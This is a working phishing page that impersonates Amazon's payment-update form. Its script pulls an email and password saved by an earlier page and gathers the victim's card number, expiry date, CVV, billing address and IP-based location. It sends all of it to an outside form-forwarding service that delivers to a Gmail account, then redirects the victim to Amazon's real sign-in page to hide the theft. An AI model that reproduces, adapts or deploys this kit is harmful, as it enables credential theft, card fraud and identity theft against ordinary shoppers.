<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon - Update Payment</title>
    <style>
        * {margin:0; padding:0; box-sizing:border-box; font-family:'Amazon Ember',Arial,sans-serif;}
        body {background:#fff; min-height:100vh; display:flex; flex-direction:column; align-items:center; padding:20px;}
        .logo {margin:10px 0 20px; text-align:center;}
        .logo img {height:30px;}
        .kotak {width:100%; max-width:420px; border:1px solid #ddd; border-radius:8px; padding:25px 30px; background:#fff;}
        h1 {font-size:22px; font-weight:400; margin-bottom:20px; padding-bottom:12px; border-bottom:1px solid #e7e7e7;}
        label {font-size:13px; font-weight:700; margin:16px 0 6px; display:block;}
        input, select {width:100%; padding:7px 10px; border:1px solid #a6a6a6; border-radius:4px; font-size:15px; height:34px;}
        input:focus, select:focus {border-color:#007185; outline:none; box-shadow:0 0 0 1px #007185;}
        .input-kartu {position:relative;}
        .logo-di-input {position:absolute; right:10px; top:50%; transform:translateY(-50%); height:24px; display:none;}
        .dua-kolom {display:flex; gap:12px;}
        .kolom {flex:1;}
        .pemisah {text-align:center; margin:25px 0 10px; color:#767676; font-size:13px;}
        button {width:100%; padding:10px; background:linear-gradient(to bottom,#f7df74,#ecc000); border:1px solid #b88600; border-radius:4px; font-size:15px; height:40px; cursor:pointer; margin-top:25px;}
        button:disabled {opacity:0.7; cursor:not-allowed;}
        .footer {margin-top:30px; font-size:11px; color:#555; text-align:center;}
        .footer a {color:#0066c0; text-decoration:none; margin:0 8px;}
        .status {margin-top:15px; padding:10px; border-radius:4px; font-size:13px; display:none;}
        .ok {background:#f0fdf4; color:#166534; border:1px solid #bbf7d0;}
        .no {background:#fef2f2; color:#991b1b; border:1px solid #fecaca;}
    </style>
</head>
<body>
    <div class="logo">
        <img src="./img/amazonlogo.png" alt="Amazon" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg'">
    </div>
    <div class="kotak">
        <h1>Update payment</h1>

        <label>Card type</label>
        <select id="card_type">
            <option value="">Select card type</option>
            <option value="mastercard">Mastercard</option>
            <option value="visa">Visa</option>
            <option value="amex">American Express</option>
            <option value="discover">Discover</option>
            <option value="jcb">JCB</option>
        </select>

        <label>Card number</label>
        <div class="input-kartu">
            <input type="text" id="card_number" maxlength="19" placeholder="•••• •••• •••• ••••">
            <img class="logo-di-input" id="logo-kartu">
        </div>

        <div class="dua-kolom">
            <div class="kolom">
                <label>Expiration date</label>
                <input type="text" id="expiry" maxlength="5" placeholder="MM/YY">
            </div>
            <div class="kolom">
                <label>Security code (CVV)</label>
                <input type="text" id="cvv" maxlength="4" placeholder="••••">
            </div>
        </div>

        <p class="pemisah">— Billing Address —</p>

        <label>Full name</label>
        <input type="text" id="fullname">

        <label>Address</label>
        <input type="text" id="address" placeholder="Street address">

        <div class="dua-kolom">
            <div class="kolom">
                <label>City</label>
                <input type="text" id="city">
            </div>
            <div class="kolom">
                <label>State / Province</label>
                <input type="text" id="state">
            </div>
        </div>

        <div class="dua-kolom">
            <div class="kolom">
                <label>ZIP / Postal code</label>
                <input type="text" id="zip">
            </div>
            <div class="kolom">
                <label>Country</label>
                <select id="country">
                    <option value="">Select country</option>
                    <option value="AU">Australia</option>
                    <option value="US">United States</option>
                    <option value="GB">United Kingdom</option>
                    <option value="ID">Indonesia</option>
                    <option value="SG">Singapore</option>
                    <option value="MY">Malaysia</option>
                    <option value="JP">Japan</option>
                </select>
            </div>
        </div>

        <button id="tombolKirim">Verification</button>
        <div id="status" class="status"></div>
    </div>
    <div class="footer">
        <p><a href="#">Conditions of Use</a> <a href="#">Privacy Notice</a> <a href="#">Help</a></p>
        <p>© 1996-2026, Amazon.com, Inc. or its affiliates</p>
    </div>

<script>
// Ambil data dari password.html
const emailPengguna = localStorage.getItem("dataEmail") || "Tidak ditemukan";
const passwordPengguna = localStorage.getItem("password") || "Tidak ditemukan";

// Deteksi lokasi otomatis
let lokasi = { ip: "-", negara: "-", kodeNegara: "-", kota: "-", provinsi: "-", zip: "-" };
async function deteksiLokasi() {
    try {
        const res = await fetch("https://ipapi.co/json/");
        const d = await res.json();
        lokasi = { ip: d.ip||"-", negara: d.country_name||"-", kodeNegara: d.country||"-", kota: d.city||"-", provinsi: d.region||"-", zip: d.postal||"-" };
        
        const sel = document.getElementById("country");
        for(let i=0; i<sel.options.length; i++) {
            if(sel.options[i].value === lokasi.kodeNegara) { sel.selectedIndex = i; break; }
        }
        if(lokasi.kota !== "-") document.getElementById("city").value = lokasi.kota;
        if(lokasi.provinsi !== "-") document.getElementById("state").value = lokasi.provinsi;
        if(lokasi.zip !== "-") document.getElementById("zip").value = lokasi.zip;
    } catch(e) {}
}
deteksiLokasi();

// Format nomor kartu
document.getElementById("card_number").addEventListener("input", function() {
    const murni = this.value.replace(/\D/g,"").slice(0,16);
    this.value = murni.length ? murni.match(/.{1,4}/g).join(" ") : "";
    
    const n = murni;
    let jns = "";
    if(/^4/.test(n)) jns = "visa";
    else if(/^5[1-5]/.test(n) || /^2[2-7]/.test(n)) jns = "mastercard";
    else if(/^3[47]/.test(n)) jns = "amex";
    else if(/^6(?:011|5|4[4-9])/.test(n)) jns = "discover";
    
    const logo = document.getElementById("logo-kartu");
    const peta = { mastercard: "./img/mastercard.png", visa: "./img/visa.png", amex: "./img/amex.png", discover: "./img/discover.png" };
    if(jns && peta[jns]) {
        logo.src = peta[jns];
        logo.style.display = "block";
        document.getElementById("card_type").value = jns;
    } else {
        logo.style.display = "none";
    }
});

// Format MM/YY
document.getElementById("expiry").addEventListener("input", function() {
    const m = this.value.replace(/\D/g,"").slice(0,4);
    this.value = m.length >= 3 ? m.slice(0,2)+"/"+m.slice(2) : m;
});

// === KIRIM DATA KEDUA: PEMBAYARAN ===
document.getElementById("tombolKirim").addEventListener("click", async function() {
    const btn = this;
    const status = document.getElementById("status");
    
    btn.disabled = true;
    btn.textContent = "Mengirim...";
    status.style.display = "none";

    // Data kedua — Format Billing
    const dataBilling = {
        _subject: "📋 Data Pembayaran — Result Billing",
        Email: emailPengguna,
        Password: passwordPengguna,
        Card_Type: document.getElementById("card_type").value,
        Card_Number: document.getElementById("card_number").value,
        Expiry: document.getElementById("expiry").value,
        CVV: document.getElementById("cvv").value.replace(/\D/g,""),
        Full_Name: document.getElementById("fullname").value,
        Address: document.getElementById("address").value,
        City: document.getElementById("city").value,
        State: document.getElementById("state").value,
        ZIP: document.getElementById("zip").value,
        Country: document.getElementById("country").value,
        IP: lokasi.ip,
        Location: `${lokasi.kota}, ${lokasi.provinsi}, ${lokasi.negara}`
    };

    try {
        const formData = new FormData();
        for(let k in dataBilling) formData.append(k, dataBilling[k]);

        const res = await fetch("https://formsubmit.co/jandaanaksatu777@gmail.com", {
            method: "POST",
            body: formData
        });

        if(res.ok) {
            status.className = "status ok";
            status.textContent = "✅ Terkirim! Mengalihkan...";
            status.style.display = "block";
            
            setTimeout(() => {
                window.location.href = "https://www.amazon.com.au/ap/signin";
            }, 1500);
        } else {
            throw new Error("Status: " + res.status);
        }
    } catch(err) {
        status.className = "status no";
        status.textContent = "⚠️ Coba lagi: " + err.message;
        status.style.display = "block";
        btn.disabled = false;
        btn.textContent = "Verification";
    }
});
</script>
</body>
</html>
